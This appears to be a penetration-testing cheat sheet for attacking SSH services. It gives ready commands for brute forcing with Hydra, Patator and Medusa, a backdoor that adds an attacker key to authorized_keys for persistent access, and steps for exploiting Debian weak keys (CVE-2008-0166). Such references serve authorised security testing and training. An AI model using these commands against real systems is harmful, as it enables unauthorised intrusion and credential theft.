## 1️⃣ Enumeration Checklist

```bash
- Identify SSH version
- Check supported authentication methods
- Attempt username enumeration (if possible)
- Test default / weak credentials
- Check for vulnerable versions
- Attempt brute force (if in scope)
- Reuse credentials found elsewhere
```

## 2️⃣ Basic Connectivity & Banner Grabbing

```bash
# Banner grab
nc -nv $ip 22

# Standard login
ssh user@$ip
```

## 3️⃣ Login with Private Key

```bash
# Ensure proper permissions
chmod 600 private.key

# Login using private key
ssh -i private.key user@$ip
```

## 4️⃣ Credential Attacks (If In Scope)

### Hydra

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 $ip ssh
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 $ip ssh
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

### Patator

```bash
patator ssh_login host=$ip user=user password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:code=1
```

### Medusa

```bash
medusa -h $ip -u user -P /usr/share/wordlists/rockyou.txt -M ssh
```

⚠️ Only perform brute force if allowed in scope.

## 5️⃣ Nmap SSH Scripts

```bash
# Run SSH-related scripts
nmap -p 22 -sV --script=ssh* $ip
```

### Common Useful Scripts

```
ssh2-enum-algos.nse
ssh-auth-methods.nse
ssh-hostkey.nse
ssh-publickey-acceptance.nse
sshv1.nse
```

### Excluding Brute Force

```bash
nmap -p 22 --script ssh2-enum-algos,ssh-auth-methods,ssh-publickey-acceptance,sshv1,ssh-hostkey $ip
```

## 6️⃣ SSH Key Enumeration & Usage

### Generate Key Pair

```bash
ssh-keygen
```

### Generate Custom Key

```bash
ssh-keygen -f mykey
cat mykey.pub
```

### Short RSA Key (Lab Use Only)

```bash
ssh-keygen -f mykey -t rsa -b 768
```

## 7️⃣ Authorized Keys Backdoor (Post-Exploitation)

### Attacker Machine

```bash
ssh-keygen -f myshell
chmod 600 myshell
cat myshell.pub
```

### Victim Machine

```bash
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Connect

```bash
ssh -i myshell user@$ip
```

## 8️⃣ Handling Legacy / Weak Key Exchange

```bash
ssh $ip -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
```

Used when server supports weak/legacy algorithms.

## 9️⃣ Vulnerability Checks

### CVE-2008-0166 (Debian OpenSSL Weak Keys)

Affected:
Debian-based systems (2006–2008) with predictable SSH keys.

Exploit reference:
[https://www.exploit-db.com/exploits/5720](https://www.exploit-db.com/exploits/5720)

Key steps:

```bash
wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
bunzip2 debian_ssh_rsa_2048_x86.tar.bz2
tar -xvf debian_ssh_rsa_2048_x86.tar
```

Then use provided exploit script.

## 🔟 Configuration Files (Post-Access)

```bash
/etc/ssh/ssh_config
/etc/ssh/sshd_config
~/.ssh/authorized_keys
~/.ssh/id_rsa
~/.ssh/known_hosts
```

### Misconfiguration Checks

* PermitRootLogin enabled?
* PasswordAuthentication enabled?
* Weak ciphers allowed?
* SSHv1 enabled?
